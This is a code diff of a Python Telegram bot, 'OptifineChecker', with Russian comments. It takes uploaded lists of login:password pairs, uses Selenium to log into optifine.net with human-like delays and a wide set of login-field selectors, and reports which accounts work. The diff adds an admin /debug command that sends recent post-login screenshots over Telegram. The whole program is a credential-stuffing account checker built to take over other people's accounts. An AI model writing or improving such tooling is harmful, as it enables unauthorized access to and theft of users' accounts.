@@ -180,7 +180,7 @@ class OptifineChecker:
             # Переходим на страницу входа
             logger.info(f"🌐 Загружаю страницу входа...")
             self.driver.get("https://optifine.net/login")
-            self.human_like_delay(5, 8)  # Увеличил задержку для загрузки
+            self.human_like_delay(5, 8)
             
             # Анализируем страницу
             self.analyze_page(login[:10])
@@ -196,38 +196,31 @@ class OptifineChecker:
             # Расширенный поиск поля email/username
             email_field = None
             email_selectors = [
-                # По именам
                 "//input[@name='email']",
                 "//input[@name='username']",
                 "//input[@name='login']",
                 "//input[@name='user']",
                 "//input[@name='log']",
-                # По ID
                 "//input[@id='email']",
                 "//input[@id='username']",
                 "//input[@id='login']",
                 "//input[@id='user']",
                 "//input[@id='user_login']",
-                # По типу
                 "//input[@type='email']",
                 "//input[@type='text']",
-                # По классам
                 "//input[contains(@class, 'email')]",
                 "//input[contains(@class, 'username')]",
                 "//input[contains(@class, 'login')]",
                 "//input[contains(@class, 'user')]",
                 "//input[contains(@class, 'input')]",
-                # По placeholder
                 "//input[@placeholder='Email']",
                 "//input[@placeholder='Username']",
                 "//input[@placeholder='Login']",
                 "//input[@placeholder='E-mail']",
                 "//input[@placeholder='email']",
                 "//input[@placeholder='username']",
-                # По атрибутам
                 "//input[@autocomplete='username']",
                 "//input[@autocomplete='email']",
-                # Любой input перед полем пароля
                 "//input[@type='password']/preceding::input[1]",
             ]
             
@@ -366,11 +359,9 @@ class OptifineChecker:
             # Нажимаем кнопку
             logger.info("🖱️ Нажимаю кнопку входа")
             try:
-                # Пробуем обычный клик
                 submit_button.click()
             except:
                 try:
-                    # Пробуем клик через JavaScript
                     self.driver.execute_script("arguments[0].click();", submit_button)
                 except Exception as e:
                     logger.error(f"❌ Не удалось нажать кнопку: {e}")
@@ -381,7 +372,7 @@ class OptifineChecker:
                     }
             
             # Ждем результат
-            self.human_like_delay(8, 12)  # Увеличил задержку для обработки
+            self.human_like_delay(8, 12)
             
             # Сохраняем результат
             self.driver.save_screenshot(f"/app/debug/after_submit_{login[:10]}.png")
@@ -474,6 +465,61 @@ os.makedirs('/app/debug', exist_ok=True)
 # Создаем экземпляр
 logger.info("🚀 Создание экземпляра OptifineChecker...")
 checker = OptifineChecker()
+
+# ============= НОВАЯ КОМАНДА ДЛЯ ПОЛУЧЕНИЯ ФАЙЛОВ ОТЛАДКИ =============
+async def debug_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Отправка файлов отладки"""
+    # Проверяем, является ли пользователь администратором
+    if update.effective_user.id not in ADMIN_IDS:
+        await update.message.reply_text("❌ **Нет доступа к отладке**")
+        return
+    
+    try:
+        # Проверяем, существует ли папка debug
+        if not os.path.exists('/app/debug'):
+            await update.message.reply_text("📁 Папка /app/debug не найдена")
+            return
+        
+        # Получаем список файлов
+        files = os.listdir('/app/debug')
+        
+        if not files:
+            await update.message.reply_text("📁 Папка debug пуста")
+            return
+        
+        # Сортируем файлы по дате изменения (новые сначала)
+        files.sort(key=lambda x: os.path.getmtime(os.path.join('/app/debug', x)), reverse=True)
+        
+        # Отправляем первые 5 файлов (самые новые)
+        sent_count = 0
+        for file in files[:5]:
+            file_path = os.path.join('/app/debug', file)
+            
+            # Проверяем размер файла (Telegram ограничение ~50MB)
+            if os.path.getsize(file_path) > 50 * 1024 * 1024:
+                await update.message.reply_text(f"⚠️ Файл {file} слишком большой (>50MB)")
+                continue
+            
+            try:
+                with open(file_path, 'rb') as f:
+                    await update.message.reply_document(
+                        document=f,
+                        filename=file,
+                        caption=f"📁 **Debug файл:** `{file}`"
+                    )
+                sent_count += 1
+                await asyncio.sleep(1)  # Небольшая задержка между отправками
+            except Exception as e:
+                await update.message.reply_text(f"❌ Ошибка при отправке {file}: {e}")
+        
+        await update.message.reply_text(
+            f"✅ **Отправлено файлов:** {sent_count}\n"
+            f"📁 **Всего в папке:** {len(files)}"
+        )
+        
+    except Exception as e:
+        await update.message.reply_text(f"❌ **Ошибка:** {e}")
+        logger.error(f"Ошибка в debug_command: {e}")
 
 async def process_file(file_path, update, context):
     """Обработка файла с аккаунтами"""
@@ -650,6 +696,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"• Найдено рабочих: {bot_stats['valid']}\n\n"
         f"📥 **Отправь .txt файл** с логинами и паролями\n"
         f"Формат: логин:пароль (каждый с новой строки)\n\n"
+        f"🔧 **Для админов:** /debug - получить файлы отладки\n\n"
         f"⏱ **Работаю:** {hours}ч {minutes}мин",
         reply_markup=InlineKeyboardMarkup(keyboard)
     )
@@ -684,7 +731,8 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "⚡️ **Результат:**\n"
             "• ✅ рабочие аккаунты\n"
             "• ❌ нерабочие аккаунты\n"
-            "• ⚠️ ошибки проверки"
+            "• ⚠️ ошибки проверки\n\n"
+            "🔧 **Для админов:** /debug - получить файлы отладки"
         )
 
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -724,11 +772,14 @@ def main():
     print("🚀 ЗАПУСК OPTIFINE CHECKER")
     print("=" * 50)
     print(f"📁 Директория отладки: /app/debug")
+    print(f"👑 Admin IDs: {ADMIN_IDS}")
     print("=" * 50)
     
     app = Application.builder().token(TOKEN).build()
     
+    # Добавляем обработчики команд
     app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("debug", debug_command))  # Новая команда
     app.add_handler(CallbackQueryHandler(button_callback))
     app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
     
